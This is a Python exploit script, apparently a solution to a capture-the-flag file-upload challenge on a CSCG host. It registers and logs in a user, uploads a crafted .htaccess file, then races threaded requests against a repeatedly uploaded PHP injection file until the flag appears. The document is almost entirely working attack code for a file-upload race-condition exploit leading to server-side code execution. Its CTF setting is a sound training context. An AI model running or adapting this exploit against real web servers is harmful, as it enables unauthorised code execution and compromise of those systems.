#!/usr/bin/python3

#%% imports
from multiprocessing import Condition
from multiprocessing.connection import wait
import requests
import time

#%% init php session

BASEURL = "https://9080dfb1265f0baa917bb46e-file-upload.challenge.master.cscg.live:31337/"

proxies = {
  'http': 'http://localhost:3128',
  'https': 'http://localhost:3128',
}
s = requests.Session()
#s.proxies.update(proxies)

# init php session
s.get(BASEURL + "login.php")
time.sleep(0.5)
#%% register user

username = "AdministratoR"

s.post(BASEURL + "register.php",data={
    "username": username,
    "password": username,
    "confirm_password": username
})
time.sleep(0.5)

#%% login user
s.post(BASEURL + "login.php",data={
    "username": username,
    "password": username
})
time.sleep(0.5)
#%% upload htaccess

# Content-Disposition: form-data; name="fileToUpload"; filename="Dockerfile"
# Content-Type: application/octet-stream

s.post(BASEURL + "upload.php",files={
    "fileToUpload" : (".htaccess",open("htaccess","rb"),"application/octet-stream")
})

time.sleep(20)

#%% camel race
import concurrent.futures
i = 300

def hammer(filename):
    for i in range(20):
        resp = s.get(BASEURL + f"uploads/{filename}")
        if "CSCG" in resp.text:
            return resp.text
    return None

cond = True

while cond:

    i = i + 1
    filename = f"injection_{str(i)}.test"

    with concurrent.futures.ThreadPoolExecutor(max_workers=7) as executor:
        futures = [
            executor.submit(hammer, filename) for _ in range(13)
        ]

        s.post(BASEURL + "upload.php",files={
            "fileToUpload" : (filename,open("injection.php","rb"),"application/octet-stream")
        })

        for future in concurrent.futures.as_completed(futures):
            if (res := future.result()):
                print(res)
                cond = False

    print("Iteration ",i)
    time.sleep(0.5)

# %%
